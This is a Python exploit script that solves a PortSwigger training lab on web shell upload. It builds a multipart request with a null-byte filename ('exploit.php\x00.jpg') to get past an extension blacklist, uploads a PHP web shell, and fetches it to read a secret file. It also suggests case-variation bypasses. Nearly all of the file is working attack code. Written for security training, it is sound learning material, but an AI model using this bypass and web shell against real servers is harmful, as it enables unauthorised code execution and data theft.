# Lab 05 — Web shell upload via obfuscated file extension
# PortSwigger: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
#
# Vulnerability: The extension blacklist is thorough against direct PHP
#                variants, but validation and the SAVE logic disagree
#                about which part of a double extension is "the" extension
#                — a null byte lets us satisfy one while controlling the other
# Aim:           Upload a basic PHP web shell and exfiltrate
#                /home/carlos/secret
#
# Technique:
#   filename = exploit.php%00.jpg
#   → validation sees the string ending in ".jpg" → passes
#   → the underlying save operation truncates at the null byte
#     (legacy C-string behaviour) → actually saves as exploit.php
#
#   IMPORTANT: the null byte must reach the server as a literal byte in
#   the multipart Content-Disposition filename — we build the multipart
#   body manually here to guarantee the exact byte sequence is sent,
#   since some HTTP libraries may otherwise mangle a raw %00 in a filename.
#
# Usage: python file_upload_lab05.py <url>

import sys
import urllib3
from proxies import proxies
from file_upload_utils import (banner, section, make_session, login,
                                get_csrf_from_response, PHP_PAYLOAD,
                                check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 05 — WEB SHELL UPLOAD VIA OBFUSCATED FILE EXTENSION (NULL BYTE)")

    if len(sys.argv) != 2:
        print("  Usage: python file_upload_lab05.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm plain .php and .php.jpg alone don't achieve RCE ──────
    print("\n  ── Step 1: confirm exploit.php is blocked by the blacklist\n")
    account_page = session.get(f"{url}/my-account")
    csrf = get_csrf_from_response(account_page.text)

    files_blocked = {"avatar": ("exploit.php", PHP_PAYLOAD.encode(), "image/jpeg")}
    data = {"csrf": csrf} if csrf else {}
    r_blocked = session.post(f"{url}/my-account/avatar", files=files_blocked, data=data)
    print(f"  ℹ  Status: {r_blocked.status_code}")
    print_box("Response (should reject)", r_blocked.text[:300])

    # ── Step 2: build the null-byte payload filename manually ────────────────
    print("\n  ── Step 2: upload with filename 'exploit.php%00.jpg' (literal null byte)\n")

    # requests' `files=` parameter will URL-safe the filename in a way that
    # may not preserve a raw \x00 byte reliably across all versions/servers.
    # To guarantee exact bytes, build the multipart body manually.
    boundary = "----WebKitFormBoundaryFILEUPLOADLAB05"

    filename_with_nullbyte = "exploit.php\x00.jpg"

    # Build the body explicitly as bytes to keep control over the null byte
    body_parts = []
    if csrf:
        body_parts.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="csrf"\r\n\r\n{csrf}\r\n'.encode()
        )
    body_parts.append(
        (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="avatar"; filename="{filename_with_nullbyte}"\r\n'
            f'Content-Type: image/jpeg\r\n\r\n'
        ).encode("latin-1")  # latin-1 preserves \x00 byte-for-byte
    )
    body_parts.append(PHP_PAYLOAD.encode())
    body_parts.append(f'\r\n--{boundary}--\r\n'.encode())

    full_body = b"".join(body_parts)

    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    r_nullbyte = session.post(f"{url}/my-account/avatar", data=full_body, headers=headers)
    check_status(r_nullbyte, [200, 302], "Upload with null-byte filename")
    print_box("Response", r_nullbyte.text[:300])

    # ── Step 3: request it as exploit.php (the null byte truncated the rest) ─
    print("\n  ── Step 3: request exploit.php (post-truncation save name)\n")
    r_exec = session.get(f"{url}/files/avatars/exploit.php")
    check_status(r_exec, 200, "GET /files/avatars/exploit.php")

    print_box("LEAKED SECRET", r_exec.text.strip())

    print()
    print("  ℹ  If this didn't work, the target's language runtime may not")
    print("     be vulnerable to null byte truncation (this is a legacy")
    print("     technique — see the module notes on modern runtimes).")
    print("     Try the double-extension-only variant (exploit.php.jpg with")
    print("     case variation, e.g. exploit.pHp) as an alternative bypass.")
